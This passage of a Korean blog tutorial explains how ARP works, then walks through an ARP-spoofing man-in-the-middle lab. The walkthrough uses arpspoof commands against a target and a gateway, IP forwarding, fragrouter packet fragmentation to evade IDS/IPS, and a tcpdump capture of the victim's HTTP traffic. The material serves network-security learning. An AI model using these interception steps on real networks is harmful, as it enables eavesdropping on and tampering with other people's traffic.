이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.</p><h3 id=2-작동-원리>2. 작동 원리<a hidden class=anchor aria-hidden=true href=#2-작동-원리>#</a></h3><p>ARP는 다음과 같은 과정으로 작동합니다:</p><ol><li><strong>ARP 요청 (Request)</strong><ul><li>송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다.</li><li>이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다.</li></ul></li><li><strong>ARP 응답 (Reply)</strong><ul><li>네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다.</li><li>요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다.</li></ul></li><li><strong>주소 매핑</strong><ul><li>송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다.</li><li>이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다.</li></ul></li></ol><h3 id=3-arp-캐시>3. ARP 캐시<a hidden class=anchor aria-hidden=true href=#3-arp-캐시>#</a></h3><p>ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.<br>이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.<br>그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다.</p><h3 id=4-보안-문제>4. 보안 문제<a hidden class=anchor aria-hidden=true href=#4-보안-문제>#</a></h3><p>ARP는 신뢰할 수 있는 프로토콜이 아니며, 다음과 같은 보안 문제를 가질 수 있습니다:</p><ul><li><p><strong>ARP 스푸핑 (Spoofing)</strong></p><ul><li>공격자가 가짜 ARP 응답을 네트워크에 전송하여, 자신을 다른 호스트로 위장하고 트래픽을 가로채거나 변조할 수 있습니다.</li></ul></li><li><p><strong>ARP 캐시 포이즈닝 (Cache Poisoning)</strong></p><ul><li>공격자가 ARP 캐시에 잘못된 IP-MAC 주소 매핑을 삽입하여, 네트워크 통신을 중단시키거나 트래픽을 리다이렉트할 수 있습니다.</li></ul></li></ul><h2 id=2-arpspoof-fragrouter-도구-설치-및-기본-설명>2. arpspoof, fragrouter 도구 설치 및 기본 설명<a hidden class=anchor aria-hidden=true href=#2-arpspoof-fragrouter-도구-설치-및-기본-설명>#</a></h2><h3 id=arpspoof-설치>arpspoof 설치<a hidden class=anchor aria-hidden=true href=#arpspoof-설치>#</a></h3><p><code>arpspoof</code>는 dsniff 패키지의 일부입니다. 설치하는 방법은 다음과 같습니다</p><blockquote><p>dsniff는 네트워크 보안 분석 및 테스트를 위해 설계된 다양한 도구들을 포함하는 패키지입니다.<br>이 패키지는 네트워크 트래픽을 캡처하고 분석하며, 스니핑(sniffing)과 관련된 여러 가지 기능을 제공합니다.</p></blockquote><ul><li><strong>Ubuntu/Debian</strong></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get update
</span></span><span style=display:flex><span>sudo apt-get install dsniff
</span></span></code></pre></div><h3 id=fragrouter-설치>fragrouter 설치<a hidden class=anchor aria-hidden=true href=#fragrouter-설치>#</a></h3><p><code>fragrouter</code>는 네트워크 트래픽을 조작하는 도구로, 다음과 같이 설치할 수 있습니다:</p><ul><li><strong>Ubuntu/Debian</strong></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get update
</span></span><span style=display:flex><span>sudo apt-get install fragrouter
</span></span></code></pre></div><h2 id=3-arp-스푸핑의-원리-및-arpspoof-fragrouter-도구의-역할>3. ARP 스푸핑의 원리 및 arpspoof, fragrouter 도구의 역할<a hidden class=anchor aria-hidden=true href=#3-arp-스푸핑의-원리-및-arpspoof-fragrouter-도구의-역할>#</a></h2><h3 id=arp-스푸핑의-원리>ARP 스푸핑의 원리<a hidden class=anchor aria-hidden=true href=#arp-스푸핑의-원리>#</a></h3><p>ARP(주소 결정 프로토콜)는 IP 주소를 물리적 네트워크 주소(MAC 주소)로 매핑하는 프로토콜입니다.<br>ARP 스푸핑은 공격자가 가짜 ARP 메시지를 네트워크에 보내 자신을 다른 호스트로 위장하여 트래픽을 가로채거나 변조하는 공격 방법</p><h3 id=arpspoof-도구의-역할>arpspoof 도구의 역할<a hidden class=anchor aria-hidden=true href=#arpspoof-도구의-역할>#</a></h3><p><code>arpspoof</code>는 ARP 스푸핑 공격을 수행하는 도구로, 네트워크에서 두 호스트 사이의 트래픽을 가로채기 위해 사용됩니다.<br>예를 들어, 공격자는 arpspoof를 사용하여 게이트웨이와 타겟 호스트 간의 트래픽을 가로챌 수 있습니다.</p><blockquote><p>가짜 ARP 응답 패킷을 생성하여 네트워크의 다른 호스트에게 보내고 이를 통해 공격자는 자신의 MAC 주소를 다른 호스트의 IP 주소에 매핑하여, 트래픽을 자신을 거쳐 가게 만듬</p></blockquote><p>사용법:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo arpspoof -i <span style=color:#ff79c6>[</span>인터페이스<span style=color:#ff79c6>]</span> -t <span style=color:#ff79c6>[</span>타겟 IP<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>[</span>게이트웨이 IP<span style=color:#ff79c6>]</span>
</span></span></code></pre></div><h3 id=fragrouter-도구의-역할>fragrouter 도구의 역할<a hidden class=anchor aria-hidden=true href=#fragrouter-도구의-역할>#</a></h3><p><code>fragrouter</code>는 네트워크 트래픽을 변조하거나 조각(fragment)화하여 IDS/IPS를 우회하는 등의 공격을 돕는 도구입니다.<br>다양한 모드를 지원하며, 각 모드는 서로 다른 방법으로 트래픽을 변조합니다.</p><p>사용법:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo fragrouter -B1  <span style=color:#6272a4># 가장 기본적인 모드</span>
</span></span></code></pre></div><h4 id=모드-지원>모드 지원<a hidden class=anchor aria-hidden=true href=#모드-지원>#</a></h4><ul><li>-B1: 기본 조각화 모드. 패킷을 8바이트 크기의 조각으로 나눕니다.</li><li>-B2: 패킷을 24바이트 크기의 조각으로 나눕니다.</li><li>-B3: 모든 패킷을 임의의 크기로 나눕니다.</li><li>-B4: 모든 패킷을 최대 크기로 나누어 재조립을 어렵게 합니다.</li></ul><h3 id=ipv4-포워딩-설정>IPv4 포워딩 설정<a hidden class=anchor aria-hidden=true href=#ipv4-포워딩-설정>#</a></h3><p>ARP 스푸핑을 성공적으로 수행하려면, 스푸핑 머신이 중간자(Man-in-the-Middle) 역할을 할 수 있도록 IPv4 포워딩을 활성화해야 함</p><h4 id=ipv4-포워딩-활성화-방법>IPv4 포워딩 활성화 방법:<a hidden class=anchor aria-hidden=true href=#ipv4-포워딩-활성화-방법>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6272a4># 일시적으로 IPv4 포워딩 활성화</span>
</span></span><span style=display:flex><span>sudo sysctl -w net.ipv4.ip_forward<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 영구적으로 IPv4 포워딩 활성화</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;net.ipv4.ip_forward = 1&#34;</span> | sudo tee -a /etc/sysctl.conf
</span></span><span style=display:flex><span>sudo sysctl -p
</span></span></code></pre></div><h2 id=4-테스트-예제-arpspoof-및-fragrouter-사용>4. 테스트 예제: arpspoof 및 fragrouter 사용<a hidden class=anchor aria-hidden=true href=#4-테스트-예제-arpspoof-및-fragrouter-사용>#</a></h2><h3 id=가정된-네트워크-설정>가정된 네트워크 설정<a hidden class=anchor aria-hidden=true href=#가정된-네트워크-설정>#</a></h3><ul><li><strong>호스트 머신 (타겟)</strong>: 198.19.249.2</li><li><strong>스푸핑 머신 (공격자)</strong>: 198.19.249.3</li><li><strong>게이트웨이</strong>: 198.19.249.1</li></ul><h3 id=arpspoof-사용-예제>arpspoof 사용 예제<a hidden class=anchor aria-hidden=true href=#arpspoof-사용-예제>#</a></h3><p>호스트 머신의 트래픽을 가로채기 위해, 스푸핑 머신에서 다음 명령어를 실행</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6272a4># 198.19.249.2(타겟)에게 게이트웨이 198.19.249.1의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄</span>
</span></span><span style=display:flex><span>sudo arpspoof -i eth0 -t 198.19.249.2 198.19.249.1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 동시에, 스푸핑 머신에서 게이트웨이에도 ARP 스푸핑을 수행</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 게이트웨이 198.19.249.1에게 호스트 머신 198.19.249.2의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄</span>
</span></span><span style=display:flex><span>sudo arpspoof -i eth0 -t 198.19.249.1 198.19.249.2
</span></span></code></pre></div><p>또는 단일 명령어로 양방향 스푸핑을 수행할 수 있음.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo arpspoof -i eth0 198.19.249.2 -r 198.19.249.1
</span></span></code></pre></div><blockquote><p><code>-r</code> 옵션을 사용하면 arpspoof는 목표 IP 주소와 게이트웨이 IP 주소 간의 ARP 스푸핑을 동시에 수행할 수 있음.<br>이는 네트워크에서 게이트웨이 역할을 하는 장치로부터 목표 호스트로 가는 모든 트래픽을 가로챌 수 있게 해줍니다.</p></blockquote><h3 id=fragrouter-사용-예제>fragrouter 사용 예제<a hidden class=anchor aria-hidden=true href=#fragrouter-사용-예제>#</a></h3><p>스푸핑 머신에서 네트워크 트래픽을 변조하기 위해 fragrouter를 설정합니다. 예를 들어, 모드 1로 설정하여 패킷을 조각화합니다:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo fragrouter -B1
</span></span></code></pre></div><p>이 명령어는 들어오는 패킷을 조각화하여 트래픽을 변조 및 전달</p><ul><li>패킷 수신: 네트워크 인터페이스에서 패킷을 수신합니다.</li><li>패킷 변조: 설정된 모드에 따라 패킷을 조각화하거나 변조합니다.</li><li>패킷 전달: 변조된 패킷을 목적지로 전달합니다.</li></ul><hr><h2 id=5-tcpdump를-통한-덤프된-패킷을-보는-방법>5. tcpdump를 통한 덤프된 패킷을 보는 방법<a hidden class=anchor aria-hidden=true href=#5-tcpdump를-통한-덤프된-패킷을-보는-방법>#</a></h2><h3 id=tcpdump-기본-설명>tcpdump 기본 설명<a hidden class=anchor aria-hidden=true href=#tcpdump-기본-설명>#</a></h3><p><code>tcpdump</code>는 네트워크 인터페이스를 통해 들어오고 나가는 패킷을 캡처하고 분석하는 도구입니다.</p><h3 id=tcpdump-설치>tcpdump 설치<a hidden class=anchor aria-hidden=true href=#tcpdump-설치>#</a></h3><ul><li><strong>Ubuntu/Debian</strong>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get install tcpdump
</span></span></code></pre></div></li></ul><h3 id=tcpdump-사용법>tcpdump 사용법<a hidden class=anchor aria-hidden=true href=#tcpdump-사용법>#</a></h3><p>패킷을 캡처하기 위해서는 다음 명령어를 사용합니다</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo tcpdump -i eth0
</span></span></code></pre></div><h3 id=테스트>테스트<a hidden class=anchor aria-hidden=true href=#테스트>#</a></h3><h4 id=스푸핑-머신-공격자-에서-패킷-캡쳐>스푸핑 머신 (공격자) 에서 패킷 캡쳐<a hidden class=anchor aria-hidden=true href=#스푸핑-머신-공격자-에서-패킷-캡쳐>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6272a4># 네트워크 인터페이스 확인 </span>
</span></span><span style=display:flex><span>$ sudo tcpdump -D
</span></span><span style=display:flex><span>1.eth0 <span style=color:#ff79c6>[</span>Up, Running, Connected<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>2.any <span style=color:#ff79c6>(</span>Pseudo-device that captures on all interfaces<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>Up, Running<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>3.lo <span style=color:#ff79c6>[</span>Up, Running, Loopback<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 패킷 캡쳐 : host httpbin.org and tcp port 80</span>
</span></span><span style=display:flex><span>$ sudo tcpdump -i <span style=color:#bd93f9>1</span> -n host httpbin.org and tcp port <span style=color:#bd93f9>80</span>
</span></span></code></pre></div><h4 id=호스트-머신-타겟에서-http-호출>호스트 머신 (타겟)에서 HTTP 호출<a hidden class=anchor aria-hidden=true href=#호스트-머신-타겟에서-http-호출>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl httpbin.org/get
</span></span><span style=display:flex><span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>  <span style=color:#f1fa8c>&#34;args&#34;</span>: <span style=color:#ff79c6>{}</span>,
</span></span><span style=display:flex><span>  <span style=color:#f1fa8c>&#34;headers&#34;</span>: <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;Accept&#34;</span>: <span style=color:#f1fa8c>&#34;*/*&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;Host&#34;</span>: <span style=color:#f1fa8c>&#34;httpbin.org&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;User-Agent&#34;</span>: <span style=color:#f1fa8c>&#34;curl/8.8.0&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;X-Amzn-Trace-Id&#34;</span>: <span style=color:#f1fa8c>&#34;Root=1-667d27b9-1bc9fbf01717e5424f5d3ec1&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>}</span>,
</span></span><span style=display:flex><span>  <span style=color:#f1fa8c>&#34;origin&#34;</span>: <span style=color:#f1fa8c>&#34;124.49.100.52&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f1fa8c>&#34;url&#34;</span>: <span style=color:#f1fa8c>&#34;http://httpbin.org/get&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h4 id=스푸핑-머신-공격자-에서-내용-확인>스푸핑 머신 (공격자) 에서 내용 확인<a hidden class=anchor aria-hidden=true href=#스푸핑-머신-공격자-에서-내용-확인>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo tcpdump -i <span style=color:#bd93f9>1</span> -n host httpbin.org and tcp port <span style=color:#bd93f9>80</span>
</span></span><span style=display:flex><span>tcpdump: verbose output suppressed, use -v<span style=color:#ff79c6>[</span>v<span style=color:#ff79c6>]</span>... <span style=color:#ff79c6>for</span> full pro
</span></span><span style=display:flex><span>listening on eth0, link-type EN10MB <span style=color:#ff79c6>(</span>Ethernet<span style=color:#ff79c6>)</span>, snapshot length <span style=color:#bd93f9>262144</span> bytes
</span></span><span style=display:flex><span>08:55:23.564492 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>S<span style=color:#ff79c6>]</span>, seq 3936188444, win 64240, options <span style=color:#ff79c6>[</span>mss 1460,sackOK,TS val <span style=color:#bd93f9>1312186693</span> ecr 0,nop,wscale 7<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:23.564601 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>S<span style=color:#ff79c6>]</span>, seq 3936188444, win 64240, options <span style=color:#ff79c6>[</span>mss 1460,sackOK,TS val <span style=color:#bd93f9>1312186693</span> ecr 0,nop,wscale 7<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:23.822969 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 3173450946, win 502, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312186951</span> ecr 2806340177<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:23.823057 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 1, win 502, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312186951</span> ecr 2806340177<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:23.823188 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>P.<span style=color:#ff79c6>]</span>, seq 0:77, ack 1, win 502, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312186951</span> ecr 2806340177<span style=color:#ff79c6>]</span>, length 77: HTTP: GET /get HTTP/1.1
</span></span><span style=display:flex><span>08:55:23.823199 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>P.<span style=color:#ff79c6>]</span>, seq 0:77, ack 1, win 502, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312186951</span> ecr 2806340177<span style=color:#ff79c6>]</span>, length 77: HTTP: GET /get HTTP/1.1
</span></span><span style=display:flex><span>08:55:24.027301 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 484, win 499, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187155</span> ecr 2806340382<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:24.027380 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 484, win 499, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187155</span> ecr 2806340382<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:24.027960 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>F.<span style=color:#ff79c6>]</span>, seq 77, ack 484, win 501, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187156</span> ecr 2806340382<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:24.027978 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>F.<span style=color:#ff79c6>]</span>, seq 77, ack 484, win 501, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187156</span> ecr 2806340382<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:24.240286 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 485, win 501, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187369</span> ecr 2806340595<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>08:55:24.240313 IP 198.19.249.2.46206 &gt; 44.206.219.79.80: Flags <span style=color:#ff79c6>[</span>.<span style=color:#ff79c6>]</span>, ack 485, win 501, options <span style=color:#ff79c6>[</span>nop,nop,TS val <span style=color:#bd93f9>1312187369</span> ecr 2806340595<span style=color:#ff79c6>]</span>, length <span style=color:#bd93f9>0</span>
</span></span></code></pre></div><h4 id=capturepcap-파일로-저장-후-wireshark-툴로-확인>capture.pcap 파일로 저장 후, Wireshark 툴로 확인<a hidden class=anchor aria-hidden=true href=#capturepcap-파일로-저장-후-wireshark-툴로-확인>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo tcpdump -i <span style=color:#bd93f9>1</span> -n host httpbin.org and tcp port <span style=color:#bd93f9>80</span> -w capture.pcap
</span></span></code></pre></div><p><img loading=lazy src=/images/2024-06-27-18-08-23.png></p><hr><h2 id=기타>기타<a hidden class=anchor aria-hidden=true href=#기타>#</a></h2><h3 id=docker-환경에서의-테스트-이슈>Docker 환경에서의 테스트 이슈<a hidden class=anchor aria-hidden=true href=#docker-환경에서의-테스트-이슈>#</a></h3><ul><li>Docker의 기본 브리지 네트워크 설정에서 외부 네트워크와의 통신이 올바르게 설정되지 않았을 수 있습니다.<ul><li>Docker 브리지 네트워크에서 외부 네트워크로 나가는 패킷은 NAT를 통해 변환되는데, 이 과정에서 문제가 발생할 수 있습니다.</li></ul></li><li>docker macvlan 네트워크 모드에서는 테스트 가능 : <a href=/devops/docker-macvlan/>Docker 네트워크 - Macvlan</a>{:target="_blank"}</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://cdecl.github.io/tags/arp/>Arp</a></li><li><a href=https://cdecl.github.io/tags/arpspoof/>Arpspoof</a></li><li><a href=https://cdecl.github.io/tags/fragrouter/>Fragrouter</a></li><li><a href=https://cdecl.github.io/tags/arp-%EC%8A%A4%ED%91%B8%ED%95%91/>Arp 스푸핑</a></li><li><a href=https://cdecl.github.io/tags/tcpdump/>Tcpdump</a></li></ul></footer><script src=https://giscus.app/client.js data-repo=cdecl/cdecl.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzNDk1ODUyNjg=" data-category=General data-category-id=DIC_kwDOFNY_dM4C1XMk data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=transparent_dark data-lang=ko crossorigin=anonymous async></script></article></main><footer class=footer><span>&copy; 2026 <a href=https://cdecl.github.io/>cdeclog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>